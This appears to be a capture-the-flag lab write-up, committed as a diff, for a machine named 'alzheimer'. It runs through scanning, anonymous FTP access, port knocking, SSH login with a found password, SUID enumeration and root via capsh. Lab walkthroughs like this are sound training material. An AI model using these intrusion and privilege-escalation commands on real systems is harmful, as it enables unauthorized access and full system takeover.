@@ -1,0 +1,129 @@
+fping -aqg 10.0.2.1/24
+---------------------------------------------------------------------------------------------------------------------------------------------
+nmap -sS -v -p- -T4 10.0.2.76
+
+21/tcp open     ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.52
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp filtered ssh
+80/tcp filtered http
+-----------------------------------------------------------------------------------------------------------------------------------------------
+└─# ftp 10.0.2.76 
+Connected to 10.0.2.76.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.76:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
+drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
+-rw-r--r--    1 0        0             116 Mar 28 19:30 .secretnote.txt
+226 Directory send OK.
+ftp> get .secretnote.txt 
+local: .secretnote.txt remote: .secretnote.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .secretnote.txt (116 bytes).
+226 Transfer complete.
+116 bytes received in 0.00 secs (1.0057 MB/s)
+--------------------------------------------------------------------------------------------------------------------------------------------
+└─# cat .secretnote.txt 
+I need to knock this ports and 
+one door will be open!
+1000
+2000
+3000
+Ihavebeenalwayshere!!!
+Ihavebeenalwayshere!!!
+---------------------------------------------------------------------------------------------------------------------------------------------
+knock <targetIP> 1000 2000 3000
+---------------------------------------------------------------------------------------------------------------------------------------------
+again nmap : 
+
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.52
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)
+|   256 35:f1:70:ab:a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)
+|_  256 be:15:fa:b6:81:d6:7f:ab:c8:1c:97:a5:ea:11:85:4e (ED25519)
+80/tcp open  http    nginx 1.14.2
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.2
+|_http-title: Site doesn't have a title (text/html).
+-------------------------------------------------------------------------------------------------------------------------------------------------
+visit website.. medusa lost password on server(!) enumerated all server but nothing!
+again read .secretnote.txt
+----------------------------------------------------------------------------------------------------------------------
+I need to knock this ports and 
+one door will be open!
+1000
+2000
+3000
+Ihavebeenalwayshere!!!
+Ihavebeenalwayshere!!!     
+---------------------------------------------------------------------------------------
+medusa:Ihavebeenalwayshere!!!
+---------------------------------------------------------------------------------------
+medusa@alzheimer:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-sr-x 1 root root 26776 Feb  6  2019 /usr/sbin/capsh
+---------------------------------------------------------------------------------------------
+medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
+root@alzheimer:~# id ; uname -a ; whoami
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(medusa)
+Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+root
+root@alzheimer:~# 
+
+
+
+
+
+                       
+
+
+
+                       
+                       
